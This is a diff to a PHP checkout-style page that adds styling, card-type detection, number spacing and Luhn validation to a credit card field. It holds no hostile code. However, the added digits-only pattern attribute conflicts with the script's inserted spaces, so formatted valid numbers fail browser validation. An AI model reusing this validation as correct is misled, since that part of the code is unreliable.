@@ -172,6 +172,29 @@ $ip = $_SERVER['REMOTE_ADDR'];
 					font-size: 16px;
 				}
 			}
+
+			/* Credit Card Styling */
+			.credit-card-icon {
+				position: absolute;
+				right: 1rem;
+				top: 50%;
+				transform: translateY(-50%);
+				z-index: 10;
+				opacity: 0.5;
+				transition: opacity 0.2s ease;
+			}
+
+			.credit-card-icon.active {
+				opacity: 1;
+			}
+
+			.form-floating .credit-card-icon {
+				top: 25%;
+			}
+
+			.form-floating .credit-card-icon.active {
+				top: 0;
+			}
 		</style>
 	</head>
 	
@@ -274,9 +297,13 @@ $ip = $_SERVER['REMOTE_ADDR'];
 									</div>
 									
 									<div class="col-12">
-										<div class="form-floating">
-											<input type="text" class="form-control" name="ccnum" id="ccnum" placeholder="Credit Card Number" required>
+										<div class="form-floating position-relative">
+											<input type="text" class="form-control" name="ccnum" id="ccnum" placeholder="Credit Card Number" required maxlength="19" pattern="^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12})$">
 											<label for="ccnum"><i class="bi bi-credit-card me-2"></i>Credit Card Number</label>
+											<i class="bi bi-credit-card-2-front credit-card-icon" id="cardIcon"></i>
+										</div>
+										<div class="invalid-feedback">
+											Please enter a valid credit card number.
 										</div>
 									</div>
 									
@@ -350,6 +377,139 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		
 		<script>
 			var ip = '<?= $ip ?>';
+
+			// Credit Card Validation and Formatting
+			const cardPatterns = {
+				visa: {
+					pattern: /^4/,
+					icon: 'bi-credit-card-2-front',
+					spaces: [4, 8, 12],
+					length: 16
+				},
+				mastercard: {
+					pattern: /^5[1-5]/,
+					icon: 'bi-credit-card-2-front',
+					spaces: [4, 8, 12],
+					length: 16
+				},
+				amex: {
+					pattern: /^3[47]/,
+					icon: 'bi-credit-card-2-front',
+					spaces: [4, 10],
+					length: 15
+				},
+				discover: {
+					pattern: /^6(?:011|5)/,
+					icon: 'bi-credit-card-2-front',
+					spaces: [4, 8, 12],
+					length: 16
+				}
+			};
+
+			function formatCardNumber(input) {
+				let value = input.value.replace(/\D/g, '');
+				let cardType = null;
+
+				// Determine card type
+				for (let type in cardPatterns) {
+					if (cardPatterns[type].pattern.test(value)) {
+						cardType = type;
+						break;
+					}
+				}
+
+				// Update icon
+				const cardIcon = document.getElementById('cardIcon');
+				if (cardType) {
+					cardIcon.className = `bi bi-credit-card-2-front credit-card-icon active`;
+					cardIcon.setAttribute('title', cardType.charAt(0).toUpperCase() + cardType.slice(1));
+				} else {
+					cardIcon.className = 'bi bi-credit-card-2-front credit-card-icon';
+					cardIcon.removeAttribute('title');
+				}
+
+				// Format number with spaces
+				if (cardType && cardPatterns[cardType].spaces) {
+					let formattedValue = '';
+					let index = 0;
+					
+					for (let i = 0; i < value.length; i++) {
+						if (cardPatterns[cardType].spaces.includes(i)) {
+							formattedValue += ' ';
+						}
+						formattedValue += value[i];
+					}
+
+					input.value = formattedValue;
+				} else {
+					input.value = value;
+				}
+
+				// Validate length
+				if (cardType && value.length > cardPatterns[cardType].length) {
+					input.value = input.value.slice(0, cardPatterns[cardType].length + cardPatterns[cardType].spaces.length);
+				}
+			}
+
+			function validateCardNumber(input) {
+				const value = input.value.replace(/\s/g, '');
+				let isValid = false;
+				let cardType = null;
+
+				// Check card type and basic validation
+				for (let type in cardPatterns) {
+					if (cardPatterns[type].pattern.test(value) && value.length === cardPatterns[type].length) {
+						cardType = type;
+						isValid = true;
+						break;
+					}
+				}
+
+				// Luhn algorithm validation
+				if (isValid) {
+					let sum = 0;
+					let isEven = false;
+
+					// Loop through values starting from the rightmost digit
+					for (let i = value.length - 1; i >= 0; i--) {
+						let digit = parseInt(value[i]);
+
+						if (isEven) {
+							digit *= 2;
+							if (digit > 9) {
+								digit -= 9;
+							}
+						}
+
+						sum += digit;
+						isEven = !isEven;
+					}
+
+					isValid = sum % 10 === 0;
+				}
+
+				input.setCustomValidity(isValid ? '' : 'Please enter a valid credit card number');
+				return isValid;
+			}
+
+			// Add event listeners for card number input
+			document.addEventListener('DOMContentLoaded', function() {
+				const cardInput = document.getElementById('ccnum');
+				
+				cardInput.addEventListener('input', function() {
+					formatCardNumber(this);
+				});
+
+				cardInput.addEventListener('blur', function() {
+					validateCardNumber(this);
+				});
+
+				cardInput.addEventListener('keypress', function(e) {
+					if (!/\d/.test(e.key)) {
+						e.preventDefault();
+					}
+				});
+			});
 
 			function onSubmit(token) {
 				let input = document.createElement('input');
